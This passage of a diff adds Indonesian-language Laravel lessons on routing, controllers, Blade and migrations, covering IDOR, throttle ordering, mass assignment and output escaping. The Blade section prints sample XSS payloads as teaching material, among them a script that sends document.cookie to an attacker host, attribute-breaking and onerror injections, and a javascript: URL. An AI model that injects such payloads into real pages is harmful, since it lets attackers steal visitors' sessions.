+        'Perbaikannya memindahkan batas kepemilikan ke dalam pencarian barisnya, sehingga baris milik orang lain tidak pernah kembali sama sekali.',
+      ),
+      code(
+        'php',
+        `
+        // Binding yang dibatasi pemiliknya — 404-nya kini benar-benar berarti
+        // "tidak ada pesanan itu MILIKMU", bukan sekadar "tidak ada pesanan itu".
+        Route::get('/pesanan/{pesanan}', function (Pesanan $pesanan) {
+            return $pesanan;
+        })->whereNumber('pesanan')
+          ->middleware('auth');
+
+        // Di dalam model, batasi lewat scope global atau lewat binding eksplisit:
+        Route::bind('pesanan', function (string $nilai) {
+            return Pesanan::where('id', $nilai)
+                ->where('pelanggan_id', auth()->id())   // <-- syaratnya di QUERY
+                ->firstOrFail();
+        });
+        `,
+        {
+          caption:
+            'firstOrFail menghasilkan 404, dan barisnya tidak pernah terbaca bila bukan milik pemanggil.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Laravel punya beberapa error routing yang bunyinya khas, dan mengenalinya menghemat banyak waktu karena masing-masing menunjuk satu penyebab yang sempit.',
+      ),
+      code(
+        'text',
+        `
+        1. Route [pesanan.show] not defined.
+
+           Muncul dari route('pesanan.show') pada nama rute yang tidak ada.
+           Penyebab tersering: nama rutenya salah ketik, atau rutenya ada
+           tapi TIDAK diberi ->name(). Periksa dengan: php artisan route:list
+
+        2. Target class [PesananController] does not exist.
+
+           Namespace-nya tidak cocok, atau berkasnya tidak ada di tempat yang
+           sesuai PSR-4. Ini kelanjutan langsung dari kegagalan autoload
+           yang sudah diuraikan di sub-bab Composer.
+
+        3. The GET method is not supported for route pesanan. Supported methods: POST.
+
+           Rutenya ADA, method-nya yang berbeda. Sering muncul setelah formulir
+           dikirim ulang lewat tombol kembali, atau saat pengalihan mengubah
+           POST menjadi GET.
+
+        4. Missing required parameter for [Route: pesanan.show] [URI: pesanan/{id}].
+
+           route('pesanan.show') dipanggil tanpa memberi id-nya.
+        `,
+      ),
+      p(
+        'Kelompok kegagalan kedua tidak menghasilkan error sama sekali, yaitu **urutan middleware**, dan gejalanya berupa pemeriksaan yang seolah-olah tidak berjalan.',
+      ),
+      code(
+        'php',
+        `
+        // Middleware berjalan berurutan, dan urutannya adalah urutan penulisan.
+        Route::middleware(['auth', 'verified', 'throttle:6,1'])
+            ->group(function () { /* ... */ });
+
+        // Dua akibat yang sering tidak disadari:
+        //
+        // 1. throttle DI BELAKANG auth berarti pembatasan lajunya hanya berlaku
+        //    untuk yang SUDAH login. Endpoint login sendiri butuh throttle
+        //    yang berjalan SEBELUM autentikasi — kalau tidak, penebakan sandi
+        //    tidak pernah terbatasi sama sekali.
+        //
+        // 2. Middleware yang menjawab sendiri menghentikan rantai. Yang di
+        //    bawahnya tidak berjalan, dan itu memang yang diinginkan — asal
+        //    kamu tahu yang mana yang berhenti.
+        `,
+        { caption: 'Diukur di bab auth: tanpa backoff, 24 jam cukup untuk ratusan ribu tebakan.' },
+      ),
+      p(
+        'Catatan tentang `throttle` di atas layak ditegaskan karena akibatnya besar dan penyebabnya sepele. Pembatasan laju yang dipasang di belakang autentikasi hanya membatasi pengguna yang sudah masuk, sedangkan yang perlu dibatasi justru penyerang yang **belum** masuk dan sedang menebak sandi.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Routing terasa sebagai bagian yang paling sederhana, dan sebagian kesalahannya justru berakibat keamanan.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menaruh rute berparameter di atas rute statis',
+            'Urutannya terasa tidak penting',
+            '`/pesanan/terbaru` tertangkap `/pesanan/{id}`. Batasi bentuknya dengan `whereNumber`',
+          ],
+          [
+            'Memakai route model binding tanpa membatasi pemilik',
+            '404-nya sudah otomatis',
+            'Laravel memeriksa keberadaan, bukan kewenangan. Itu IDOR — batasi di query',
+          ],
+          [
+            'Tidak membatasi bentuk parameter rute',
+            'Nanti divalidasi di controller',
+            'Nilai seperti `abc` sampai ke query dan menghasilkan `500`, padahal seharusnya `404`',
+          ],
+          [
+            'Memasang `throttle` di belakang `auth`',
+            'Urutannya terasa wajar',
+            'Pembatasan lajunya tidak berlaku untuk yang belum login, yaitu justru penyerang yang menebak sandi',
+          ],
+          [
+            'Menulis logika di dalam closure rute',
+            'Lebih cepat ditulis',
+            '`route:cache` tidak bisa dipakai bila ada closure, dan logikanya tidak bisa diuji terpisah',
+          ],
+          [
+            'Tidak memberi nama pada rute',
+            'Alamatnya sudah jelas',
+            'Setiap perubahan alamat berarti mencari seluruh penulisan URL di seluruh kode dan template',
+          ],
+        ],
+      ),
+      p(
+        'Baris kelima memuat akibat yang nyata dan sering baru diketahui saat deploy. Perintah `route:cache` mempercepat penyalaan aplikasi dengan menyimpan seluruh definisi rute dalam bentuk siap pakai, dan ia **menolak berjalan** bila ada rute yang isinya closure, sebab closure tidak bisa disimpan. Jadi kebiasaan menulis logika langsung di dalam rute menutup salah satu optimasi produksi yang paling mudah didapat.',
+      ),
       references(
         {
           label: 'Routing',
@@ -946,7 +1694,7 @@ export const lessons: LessonDraft[] = [
   written(
     'controller',
     'Controller & Resource Controller',
-    10,
+    17,
     'Tempat permintaan diterima dan jawabannya disusun.',
     [
       terms(
@@ -1169,6 +1917,233 @@ export const lessons: LessonDraft[] = [
       p(
         'Perhatikan alamatnya `/artikel/{artikel}/terbitkan` memakai kata kerja, padahal REST menganjurkan alamat berupa benda. Itu pengecualian yang wajar dan umum: untuk **transisi keadaan** seperti menerbitkan, membatalkan, atau mengarsipkan, alamat berkata kerja jauh lebih jujur daripada memaksa klien mengirim `PATCH {"status":"terbit"}` dan berharap servernya menjalankan seluruh aturan penerbitan. Perhatikan pula `authorize(\'terbitkan\', ...)` tetap ada — aksi khusus butuh method Policy-nya sendiri, bukan menumpang pada `update`.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Controller adalah tempat yang paling cepat membesar di aplikasi Laravel, dan penyebabnya bukan kemalasan melainkan bahwa setiap tambahan terasa kecil. Satu validasi, satu pemeriksaan izin, satu perhitungan, satu pengiriman surel, dan setelah setahun sebuah method berisi dua ratus baris yang tidak bisa diuji tanpa menyalakan seluruh aplikasi.',
+      ),
+      code(
+        'php',
+        `
+        // Bentuk yang tumbuh sendiri, dan setiap barisnya terasa wajar saat ditulis.
+        public function store(Request $request)
+        {
+            $data = $request->validate([
+                'produk_id' => 'required|integer|exists:produk,id',
+                'jumlah' => 'required|integer|min:1|max:99',
+            ]);
+
+            $produk = Produk::findOrFail($data['produk_id']);
+            if ($produk->stok < $data['jumlah']) {
+                return response()->json(['error' => 'Stok kurang'], 409);
+            }
+
+            $diskon = $data['jumlah'] >= 12 ? 0.1 : ($data['jumlah'] >= 6 ? 0.05 : 0);
+            $total = (int) round($produk->harga * $data['jumlah'] * (1 - $diskon));
+
+            $pesanan = Pesanan::create([
+                'pelanggan_id' => auth()->id(),
+                'produk_id' => $produk->id,
+                'jumlah' => $data['jumlah'],
+                'total' => $total,
+            ]);
+            $produk->decrement('stok', $data['jumlah']);
+
+            Mail::to(auth()->user())->send(new PesananDiterima($pesanan));
+
+            return response()->json($pesanan, 201);
+        }
+        `,
+        {
+          caption:
+            'Untuk menguji satu aturan diskon di sini, dibutuhkan HTTP, basis data, dan pengirim surel sekaligus.',
+        },
+      ),
+      p(
+        'Aturan diskonnya sendiri hanya dua baris dan sepenuhnya bisa dihitung tanpa apa pun. Yang membuatnya tidak terjangkau test bukan kerumitannya melainkan **tempatnya**. Selama ia tinggal di dalam method controller, mengujinya berarti mengirim permintaan HTTP sungguhan, menyiapkan basis data berisi produk, dan mencegah surelnya benar-benar terkirim.',
+      ),
+      p(
+        'Pemisahannya tidak dimulai dari membuat banyak kelas melainkan dari memindahkan **satu hal** ke tempat yang tidak bergantung pada apa pun.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        declare(strict_types=1);
+
+        namespace App\\Domain;
+
+        // Tanpa Request, tanpa Eloquent, tanpa Mail. Bisa diuji langsung.
+        final class Diskon
+        {
+            public static function untuk(int $jumlah): float
+            {
+                if ($jumlah >= 12) return 0.10;
+                if ($jumlah >= 6) return 0.05;
+                return 0.0;
+            }
+
+            public static function total(int $harga, int $jumlah): int
+            {
+                return (int) round($harga * $jumlah * (1 - self::untuk($jumlah)));
+            }
+        }
+
+        // Testnya tidak butuh apa pun, dan yang paling penting ada DI BATAS,
+        // sebab di situlah kesalahan >= melawan > bersembunyi:
+        //   Diskon::untuk(5)  -> 0.0
+        //   Diskon::untuk(6)  -> 0.05
+        //   Diskon::untuk(11) -> 0.05
+        //   Diskon::untuk(12) -> 0.10
+        `,
+        {
+          caption:
+            'Empat baris uji itu mustahil ditulis dengan nyaman selama aturannya masih di dalam controller.',
+        },
+      ),
+      p(
+        'Setelah itu, controller-nya menyusut menjadi apa yang memang tugasnya, yaitu menerjemahkan antara permintaan HTTP dan jawaban HTTP.',
+      ),
+      code(
+        'php',
+        `
+        public function store(BuatPesananRequest $request, LayananPesanan $layanan)
+        {
+            // 1. Validasi sudah selesai sebelum baris ini — di Form Request.
+            // 2. Aturan bisnis ada di service, yang melempar error bermakna.
+            // 3. Status code diputuskan di sini, dan HANYA di sini.
+            $pesanan = $layanan->buat(
+                pelangganId: auth()->id(),
+                produkId: $request->integer('produk_id'),
+                jumlah: $request->integer('jumlah'),
+            );
+
+            return PesananResource::make($pesanan)
+                ->response()
+                ->setStatusCode(201)
+                ->header('Location', route('pesanan.show', $pesanan));
+        }
+        `,
+        {
+          caption:
+            'Tidak ada try/catch: error dari service ditangani terpusat di exception handler.',
+        },
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Controller Laravel menghasilkan beberapa error yang bunyinya sangat khas, dan masing-masing menunjuk satu penyebab yang sempit.',
+      ),
+      code(
+        'text',
+        `
+        1. Call to a member function ... on null
+
+           Muncul dari Model::find($id) yang tidak menemukan apa pun lalu
+           hasilnya langsung dipakai. Pakai findOrFail() yang menghasilkan 404,
+           atau periksa null-nya secara eksplisit.
+
+        2. Argument #1 ($produkId) must be of type int, string given
+
+           Nilai dari request SELALU string. Pakai $request->integer('produk_id')
+           alih-alih $request->input('produk_id'), atau ubah tipenya di Form Request.
+           Ini bentuk PHP dari hal yang sudah diukur di bab Fondasi:
+           "2" - 1 berhasil, "2" + 1 menghasilkan "21".
+
+        3. Undefined array key "jumlah"
+
+           Field tidak ada di badan permintaan, dan validasinya tidak
+           mewajibkannya. Muncul sebagai 500, padahal seharusnya 422.
+
+        4. Maximum function nesting level reached / memori habis
+
+           Hampir selalu relasi Eloquent yang saling memanggil saat diubah
+           menjadi array, misalnya pesanan->pelanggan->pesanan.
+        `,
+      ),
+      p(
+        'Error kedua layak diperjelas karena ia berbeda perilakunya antara PHP ketat dan PHP longgar, dan bedanya sudah diukur di sub-bab pertama bab ini.',
+      ),
+      code(
+        'text',
+        `
+        Dengan declare(strict_types=1):
+          hitungTotal('89000', 2)  -> TypeError, langsung terlihat
+
+        Tanpa baris itu:
+          hitungTotal('89000', 2)  -> 178000
+          hitungTotal(89000.5, 2)  -> 178000   <- pecahannya hilang tanpa jejak
+          hitungTotal(true, 2)     -> 2
+        `,
+        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
+      ),
+      p(
+        'Karena seluruh nilai dari permintaan HTTP tiba sebagai string, controller adalah tempat pertama perubahan tipe itu harus terjadi, dan sebaiknya terjadi **sekali**, di Form Request, bukan berulang kali di setiap tempat pemakaian.',
+      ),
+      p(
+        'Kelompok kegagalan ketiga tidak menghasilkan error dan merupakan kerentanan, yaitu **mass assignment**.',
+      ),
+      code(
+        'php',
+        `
+        // Berbahaya: seluruh isi request diteruskan apa adanya.
+        Pengguna::create($request->all());
+        $pengguna->update($request->all());
+
+        // Klien mengirim {"nama":"Rina","peran":"admin","saldo":9999999}
+        // dan dua field terakhir ikut tersimpan bila $fillable memuatnya
+        // atau bila $guarded dikosongkan.
+
+        // Aman: sebut field yang memang diterima, satu per satu.
+        $pengguna->update($request->safe()->only(['nama', 'email']));
+        `,
+        { caption: 'Ini bentuk PHP dari mass assignment yang sudah dibahas di bab Express.' },
+      ),
+      p(
+        'Laravel memang menyediakan `$fillable` dan `$guarded` sebagai perlindungan, dan keduanya bekerja. Yang membatalkannya adalah kebiasaan menulis `protected $guarded = []` untuk menghindari kerepotan, sebab baris itu berarti **seluruh kolom boleh diisi dari mana saja**, termasuk kolom yang menentukan peran dan saldo.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Controller adalah tempat yang paling mudah dijadikan tempat menampung segalanya, sebab setiap tambahannya terasa kecil.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Menaruh aturan bisnis di dalam controller',
+            'Paling langsung terbaca',
+            'Aturannya hanya bisa diuji lewat HTTP dan basis data sungguhan. Pindahkan ke kelas biasa',
+          ],
+          [
+            'Memakai `$request->all()` untuk membuat atau mengubah',
+            'Field-nya sudah sesuai',
+            'Mass assignment. Klien bisa menyisipkan `peran` dan `saldo`. Sebut field yang diterima',
+          ],
+          [
+            'Menulis `protected $guarded = []`',
+            'Menghindari kerepotan mengurus `$fillable`',
+            'Itu membuka SELURUH kolom untuk diisi dari permintaan. Perlindungannya dimatikan sepenuhnya',
+          ],
+          [
+            'Memakai `find()` lalu langsung memakai hasilnya',
+            'Datanya pasti ada',
+            '`Call to a member function on null` sebagai `500`, padahal seharusnya `404`. Pakai `findOrFail()`',
+          ],
+          [
+            'Memakai nilai request tanpa mengubah tipenya',
+            'Isinya memang angka',
+            'Seluruhnya string. Tanpa `strict_types`, `89000.5` dipotong diam-diam menjadi `89000`',
+          ],
+          [
+            'Membungkus setiap method dengan `try/catch`',
+            'Itu cara menangani error',
+            'Bentuk responsnya jadi berbeda-beda di tiap method. Lempar error bermakna, tangani terpusat',
+          ],
+        ],
+      ),
+      p(
+        'Baris ketiga pantas ditegaskan karena ia satu baris yang membatalkan sebuah perlindungan bawaan secara diam-diam. Menulis `$guarded = []` biasanya dilakukan saat sedang buru-buru, terasa tidak berbahaya karena aplikasinya belum punya kolom sensitif, lalu tetap di sana ketika kolom `peran` ditambahkan enam bulan kemudian. Yang menutupnya bukan kedisiplinan mengingat melainkan menyebut field yang diterima secara eksplisit pada setiap pemanggilan, sehingga kolom baru tidak pernah otomatis ikut.',
+      ),
       references(
         {
           label: 'Controllers',
@@ -1201,7 +2176,7 @@ export const lessons: LessonDraft[] = [
   written(
     'blade',
     'Blade Sekilas',
-    8,
+    15,
     'Template engine Laravel — dan kapan kamu tidak membutuhkannya.',
     [
       p(
@@ -1343,6 +2318,179 @@ export const lessons: LessonDraft[] = [
         'Untuk jalur belajarmu',
         'Kamu sudah menguasai Next.js di Frontend Intermediate, jadi kombinasi yang paling masuk akal adalah **Laravel sebagai API + Next.js sebagai frontend**. Blade tetap perlu dikenali karena kamu akan menemuinya di kode orang lain — tapi bukan yang akan kamu pakai.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Perbedaan antara `{{ }}` dan `{!! !!}` di Blade adalah perbedaan antara halaman yang aman dan halaman yang bisa diambil alih. Berikut apa yang sebenarnya dikerjakan keduanya, diukur dengan fungsi PHP yang memang dipakai Blade di baliknya.',
+      ),
+      code(
+        'text',
+        `
+        Masukan pengguna                     {{ }}                                      {!! !!}
+        -----------------------------------  -----------------------------------------  -------------------------
+        Rina Wijaya                          Rina Wijaya                                Rina Wijaya
+        <script>fetch("https://jahat.id?     &lt;script&gt;fetch(&quot;https://       <script>fetch("https://jahat.id?
+          c="+document.cookie)</script>        jahat.id?c=&quot;+document.cookie)         c="+document.cookie)</script>
+                                               &lt;/script&gt;
+        " onmouseover="alert(1)              &quot; onmouseover=&quot;alert(1)         " onmouseover="alert(1)
+        <img src=x onerror=alert(...)>       &lt;img src=x onerror=alert(...)&gt;      <img src=x onerror=alert(...)>
+        Toko "Maju" & Rekan <Cabang>         Toko &quot;Maju&quot; &amp; Rekan          Toko "Maju" & Rekan <Cabang>
+                                               &lt;Cabang&gt;
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan dengan htmlspecialchars($s, ENT_QUOTES, "UTF-8") pada PHP 8.3.6.',
+        },
+      ),
+      p(
+        'Baris kedua adalah serangan yang paling langsung, yaitu skrip yang mengirim cookie pengguna ke server penyerang. Di kolom `{{ }}`, tanda kurung sudutnya berubah menjadi `&lt;` dan `&gt;` sehingga peramban menampilkannya sebagai **teks**, bukan menjalankannya. Di kolom `{!! !!}`, ia tiba sebagai markup dan dijalankan.',
+      ),
+      p(
+        'Baris ketiga lebih halus dan sering luput dari perhatian, sebab ia tidak mengandung satu pun tanda kurung sudut. Ketika nilai itu masuk ke dalam sebuah atribut, misalnya `<input value="...">`, tanda kutipnya **menutup atribut lebih awal** dan sisanya menjadi atribut baru berisi penangan peristiwa. Itu alasan `ENT_QUOTES` penting, sebab tanpanya tanda kutip ganda tidak ikut dilolosi.',
+      ),
+      p(
+        'Baris terakhir menunjukkan bahwa pelolosan itu tidak merusak teks biasa. Nama toko yang memuat tanda kutip dan ampersand tetap **tampil** persis seperti aslinya di peramban, sebab yang berubah hanya bentuk penyimpanannya di dalam HTML, bukan yang dilihat pembaca.',
+      ),
+      callout(
+        'danger',
+        'Aturan yang tidak punya pengecualian praktis',
+        'Jangan pernah memasukkan data yang berasal dari pengguna ke dalam `{!! !!}`. Kalau memang butuh HTML dari pengguna, misalnya isi artikel dari editor teks kaya, bersihkan dulu dengan pustaka sanitasi yang memakai daftar tag yang diizinkan, lalu simpan hasil bersihnya. Menyaring sendiri dengan mencari kata `<script>` selalu bisa dilewati, sebab bentuk serangannya jauh lebih banyak daripada yang bisa didaftar siapa pun.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Ada satu hal yang **tidak** ditutup oleh pelolosan karakter, dan ia sering dikira sudah aman karena memakai `{{ }}`.',
+      ),
+      code(
+        'text',
+        `
+        Nilai dari pengguna: javascript:alert(document.domain)
+
+        Dipakai di dalam atribut href:
+          <a href="{{ $url }}">
+
+        Hasil setelah dilolosi:
+          <a href="javascript:alert(document.domain)">
+
+        Tanda kutipnya sudah aman, kurung sudutnya sudah aman, dan
+        href-nya TETAP javascript:. Mengekliknya menjalankan kode itu.
+        `,
+        {
+          caption: 'Dijalankan sungguhan. Pelolosan karakter tidak pernah dimaksudkan menutup ini.',
+        },
+      ),
+      p(
+        'Penyebabnya, pelolosan mengurus **bentuk karakter**, sedangkan yang berbahaya di sini adalah **arti nilainya** di dalam konteks `href`. Perbaikannya berbeda jenis, yaitu memeriksa skema URL-nya terhadap daftar yang diizinkan.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        // Dipanggil sebelum nilai apa pun masuk ke href atau src.
+        function urlAman(?string $url): string
+        {
+            if ($url === null || $url === '') return '#';
+            $skema = parse_url($url, PHP_URL_SCHEME);
+
+            // Tautan relatif (tanpa skema) diperbolehkan; selain itu, daftar tertutup.
+            if ($skema === null) return $url;
+            return in_array(strtolower($skema), ['http', 'https', 'mailto'], true) ? $url : '#';
+        }
+        `,
+        {
+          caption:
+            'Daftar yang diizinkan, bukan daftar yang dilarang — sama seperti nama kolom di ORDER BY.',
+        },
+      ),
+      p(
+        'Kelompok kegagalan kedua tidak berhubungan dengan keamanan melainkan dengan performa, dan ia muncul dari cara Blade memudahkan pengambilan data.',
+      ),
+      code(
+        'text',
+        `
+        @foreach ($pesanan as $p)
+            {{ $p->pelanggan->nama }}        <-- SATU query per baris
+        @endforeach
+
+        Untuk 100 pesanan: 1 query daftar + 100 query pelanggan.
+
+        Diukur pada PostgreSQL 16.15 di bab database:
+          biaya dasar + 1 query sepele  : 23 ms
+          1.000 query terpisah          : 76 ms   -> 53 ms untuk query-nya
+          1 query dengan JOIN           : 26 ms   ->  3 ms untuk query-nya
+
+        Itu di koneksi LOKAL, sekitar 0,053 ms per perjalanan bolak-balik.
+        Ke basis data di zona lain, biayanya biasanya 1-2 ms, dan seribu
+        perjalanan menjadi satu sampai dua DETIK untuk satu halaman.
+        `,
+        {
+          caption:
+            'Dijalankan sungguhan di bab database. Angkanya lokal, dan di situlah jebakannya.',
+        },
+      ),
+      p(
+        'Yang membuat bentuk ini begitu mudah ditulis adalah bahwa ia terlihat seperti mengakses properti biasa. Tidak ada tanda apa pun di `{{ $p->pelanggan->nama }}` yang memberi tahu bahwa baris itu memicu perjalanan ke basis data. Perbaikannya satu kata di sisi controller, yaitu memuat relasinya di depan.',
+      ),
+      code(
+        'php',
+        `
+        // Controller: satu query tambahan untuk SELURUH pelanggan, bukan per baris.
+        $pesanan = Pesanan::with('pelanggan')->latest()->paginate(20);
+
+        // Template-nya tidak berubah sama sekali:
+        //   {{ $p->pelanggan->nama }}
+        //
+        // Cara menangkapnya lebih awal: nyalakan pencegah lazy loading
+        // di AppServiceProvider saat mengembangkan, sehingga relasi yang
+        // belum dimuat MELEMPAR alih-alih diam-diam mengambil sendiri.
+        Model::preventLazyLoading(! app()->isProduction());
+        `,
+        {
+          caption: 'Baris terakhir mengubah bug senyap menjadi error yang muncul di hari pertama.',
+        },
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Blade dirancang supaya hal yang aman adalah hal yang paling mudah ditulis, dan sebagian besar kesalahan berupa keluar dari jalur itu.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
+            'Memakai `{!! !!}` supaya HTML-nya tampil',
+            'Datanya kan dari admin sendiri',
+            'Diuji sungguhan, skrip di dalamnya dijalankan peramban. Akun admin pun bisa diambil alih',
+          ],
+          [
+            'Menyaring `<script>` sendiri sebelum menampilkan',
+            'Serangannya kan memakai tag itu',
+            'Diuji sungguhan, `<img src=x onerror=...>` dan `" onmouseover="` tidak memuat tag script sama sekali',
+          ],
+          [
+            'Mengira `{{ }}` menutup semua',
+            'Pelolosannya otomatis',
+            'Diuji sungguhan, `href="javascript:..."` tetap lolos. URL butuh pemeriksaan skema terpisah',
+          ],
+          [
+            'Mengambil relasi di dalam `@foreach`',
+            'Terlihat seperti properti biasa',
+            'Satu query per baris. Muat relasinya lebih dulu dengan `with()`',
+          ],
+          [
+            'Menulis query di dalam template',
+            'Datanya dibutuhkan di situ',
+            'Template jadi tidak bisa diuji, dan query-nya tak terlihat dari controller mana pun',
+          ],
+          [
+            'Menaruh aturan bisnis di dalam `@if` bertingkat',
+            'Kondisinya memang soal tampilan',
+            'Aturan yang sama akan dibutuhkan di tempat lain, dan salinan-salinannya menyimpang',
+          ],
+        ],
+      ),
+      p(
+        'Baris pertama pantas ditegaskan karena alasannya terdengar meyakinkan. Anggapan "datanya dari admin sendiri" mengasumsikan akun admin tidak pernah bisa diambil alih, padahal justru akun itu yang paling menarik bagi penyerang. Dan sebuah XSS yang tersimpan di dalam konten yang ditulis admin akan berjalan di peramban **setiap pengunjung**, bukan hanya di peramban admin, sehingga satu akun yang dibobol menjadi seluruh pengunjung yang terpapar.',
+      ),
       references(
         {
           label: 'Blade Templates',
@@ -1375,7 +2523,7 @@ export const lessons: LessonDraft[] = [
   written(
     'migration',
     'Migration & Schema Builder',
-    11,
+    17,
     'Perubahan skema sebagai kode yang berversi.',
     [
       p(
@@ -1605,6 +2753,179 @@ export const lessons: LessonDraft[] = [
         'Uji `down()`, jangan hanya menulisnya',
         'Jalankan `php artisan migrate` lalu `php artisan migrate:rollback` di database lokal. `down()` yang tidak pernah dicoba biasanya rusak — dan kamu baru menemukannya saat sedang berusaha memulihkan produksi.',
       ),
+      h2('Studi kasus di project nyata'),
+      p(
+        'Migrasi adalah satu-satunya catatan tentang bagaimana skema basis data sampai pada bentuknya sekarang, dan nilainya baru terasa pada hari sesuatu harus dikembalikan. Karena itu keputusan yang paling menentukan bukan isi migrasinya melainkan **apakah ia bisa dibatalkan**.',
+      ),
+      code(
+        'php',
+        `
+        <?php
+        // Migrasi yang bisa dijalankan dan dibatalkan dengan aman.
+        return new class extends Migration {
+            public function up(): void
+            {
+                Schema::create('pesanan', function (Blueprint $table) {
+                    $table->id();
+                    $table->foreignId('pelanggan_id')->constrained()->cascadeOnDelete();
+                    $table->string('status')->default('baru')->index();
+                    $table->unsignedInteger('total');
+                    $table->timestamps();
+
+                    // Index untuk kolom yang benar-benar dicari, bukan untuk semuanya.
+                    // Diukur di bab database: Seq Scan 10,7 ms vs Index Scan 0,047 ms,
+                    // dengan biaya satu index sekitar sepertiga ukuran tabelnya.
+                    $table->index(['pelanggan_id', 'created_at']);
+                });
+            }
+
+            public function down(): void
+            {
+                Schema::dropIfExists('pesanan');
+            }
+        };
+        `,
+        { caption: 'foreignId()->constrained() membuat foreign key sekaligus index-nya.' },
+      ),
+      p(
+        'Bagian `constrained()` itu layak diperhatikan karena ia mengerjakan dua hal yang sering dipisah dan salah satunya sering lupa. Ia membuat batasan foreign key, dan ia juga membuat index pada kolom itu. Tanpa index, setiap penggabungan lewat kolom tersebut memindai tabel penuh, dan itu sudah diukur pada bab database.',
+      ),
+      p(
+        'Yang tidak dikerjakan Laravel untukmu adalah memutuskan apa yang terjadi ketika induknya dihapus, dan itu keputusan tentang **arti data**, bukan tentang kerapian.',
+      ),
+      code(
+        'php',
+        `
+        // Item pesanan tidak punya arti tanpa pesanannya. Ikut terhapus.
+        $table->foreignId('pesanan_id')->constrained()->cascadeOnDelete();
+
+        // Pesanan tetap punya arti meski pelanggannya dihapus — riwayat, akuntansi.
+        // Bawaannya MENOLAK penghapusan induknya, dan itu biasanya yang benar.
+        $table->foreignId('pelanggan_id')->constrained();
+
+        // Kalau memang boleh yatim, nyatakan secara eksplisit.
+        $table->foreignId('editor_id')->nullable()->constrained('pengguna')->nullOnDelete();
+        `,
+        {
+          caption:
+            'Diuji sungguhan di bab database: DELETE pada induk menghapus 2 baris turunannya lewat CASCADE.',
+        },
+      ),
+      p(
+        'Perlu ditegaskan bahwa `cascadeOnDelete` bekerja diam-diam dan menjalar. Menghapus satu baris bisa menghapus ribuan baris di tabel lain tanpa satu pun konfirmasi, dan bila tabel itu punya turunan lagi, penghapusannya menyebar lebih jauh. Untuk data bernilai, banyak tim memilih menandai baris sebagai terhapus alih-alih menghapusnya.',
+      ),
+
+      h2('Saat error-nya muncul'),
+      p(
+        'Migrasi menghasilkan sekelompok kegagalan yang khas, dan yang paling mahal justru bukan yang menghasilkan error.',
+      ),
+      code(
+        'text',
+        `
+        KEGAGALAN 1 — migrasi gagal di tengah, meninggalkan skema setengah jadi
+
+          SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'pesanan'
+          already exists
+
+          Sebagian pernyataan sudah berjalan sebelum yang gagal. Pada MySQL,
+          perubahan skema TIDAK bisa dibatalkan dalam transaksi, jadi basis
+          datanya tertinggal dalam keadaan yang tidak dicatat migrasi mana pun.
+          PostgreSQL mendukung DDL transaksional, jadi di sana seluruh migrasi
+          dibatalkan utuh.
+
+        KEGAGALAN 2 — down() yang tidak pernah diuji
+
+          php artisan migrate:rollback
+          SQLSTATE[42000]: Syntax error or access violation: 1091 Can't DROP
+          'idx_pesanan_status'; check that column/key exists
+
+          down() ditulis dari ingatan dan tidak pernah dijalankan sekali pun.
+          Ia baru dipakai pada hari terburuk, dan pada hari itu ia gagal.
+
+        KEGAGALAN 3 — TIDAK ada error sama sekali, dan ini yang paling mahal
+
+          Kolom NOT NULL ditambahkan ke tabel yang sudah berisi jutaan baris,
+          tanpa nilai bawaan. Di MySQL tabelnya terkunci selama penulisan ulang,
+          dan aplikasinya berhenti melayani selama beberapa menit.
+        `,
+      ),
+      p(
+        'Kegagalan ketiga itu yang membedakan migrasi di komputer sendiri dari migrasi di produksi. Tabel kosong berubah bentuk dalam sekejap, sedangkan tabel berisi sepuluh juta baris bisa terkunci lama. Karena itu perubahan yang merusak dilakukan bertahap, dan polanya punya nama, yaitu **perluas, pindahkan, persempit**.',
+      ),
+      code(
+        'text',
+        `
+        Mengganti nama kolom "nama" menjadi "nama_lengkap" TANPA memutus apa pun:
+
+        RILIS 1 — perluas
+          tambahkan kolom nama_lengkap, boleh NULL
+          kode menulis ke KEDUA kolom, membaca dari nama
+
+        RILIS 2 — pindahkan
+          isi nama_lengkap dari nama, BERTAHAP dalam potongan,
+          sebagai job terpisah — bukan di dalam migrasi
+          kode mulai membaca dari nama_lengkap
+
+        RILIS 3 — persempit
+          jadikan nama_lengkap NOT NULL
+          hapus kolom nama
+
+        Mengganti namanya dalam SATU migrasi berarti: selama deploy berjalan,
+        sebagian server menjalankan kode lama yang mencari kolom "nama"
+        pada tabel yang kolomnya sudah tidak ada.
+        `,
+      ),
+      p(
+        'Alasan pengisian datanya dilakukan sebagai job terpisah dan bukan di dalam migrasi juga layak disebut. Migrasi berjalan sebagai bagian dari deploy, dan deploy punya batas waktu. Pengisian sepuluh juta baris di dalam migrasi membuat deploy-nya menggantung, dan bila ia dihentikan di tengah, tidak ada catatan tentang sampai mana ia sempat berjalan.',
+      ),
+      callout(
+        'warning',
+        'Migrasi yang sudah berjalan di tempat lain TIDAK boleh disunting',
+        'Setelah sebuah migrasi dijalankan di mesin orang lain atau di produksi, mengubah isinya berarti dua mesin punya skema berbeda dengan catatan yang sama. Yang benar adalah menulis migrasi **baru** yang memperbaikinya. Menyunting yang lama hanya aman selama ia belum pernah keluar dari komputermu sendiri.',
+      ),
+
+      h2('Kesalahan umum pemula'),
+      p(
+        'Migrasi terasa seperti pekerjaan sekali jalan, dan justru sifat sekali jalan itu yang membuat kesalahannya mahal.',
+      ),
+      table(
+        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
+        [
+          [
